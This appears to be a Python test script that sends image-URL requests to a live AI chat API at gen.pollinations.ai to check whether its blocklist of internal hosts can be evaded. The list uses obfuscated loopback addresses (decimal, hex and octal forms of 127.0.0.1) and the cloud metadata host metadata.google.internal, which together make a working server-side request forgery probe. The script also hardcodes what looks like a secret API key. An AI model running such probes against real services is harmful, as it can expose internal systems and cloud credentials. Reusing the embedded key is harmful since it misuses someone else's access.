import urllib.request, json, sys

KEY = "sk_eM0BezFSREukwtH6G6YQBi3z04hy2hCy"
BASE = "https://gen.pollinations.ai/v1/chat/completions"

def test(url):
    body = json.dumps({
        "model": "openai",
        "messages": [{
            "role": "user",
            "content": [
                {"type": "text", "text": "What do you see?"},
                {"type": "image_url", "image_url": {"url": url}}
            ]
        }],
        "max_tokens": 10
    })
    req = urllib.request.Request(f"{BASE}?key={KEY}", data=body.encode(), headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=40) as r:
            d = json.load(r)
            content = d.get("choices", [{}])[0].get("message", {}).get("content", "")
            print(f"OK url={url} content={content[:120]!r}")
    except urllib.error.HTTPError as e:
        d = json.load(e)
        err = d.get("error", d)
        print(f"HTTP {e.code} url={url} err={str(err)[:200]}")
    except Exception as e:
        print(f"FAIL url={url} {type(e).__name__}: {e}")

# Candidates that bypass isBlockedUserMediaHost
for url in [
    "http://2130706433/",            # 127.0.0.1 decimal
    "http://0x7f000001/",        # 127.0.0.1 hex
    "http://0177.0.0.1/",        # 127.0.0.1 octal notation
    "http://metadata.google.internal/",  # internal DNS
    "http://127.0.0.1/",         # reference: blocked
    "http://10.0.0.1/",          # reference: blocked
    "http://1.1.1.1/",           # public: should work
]:
    test(url)
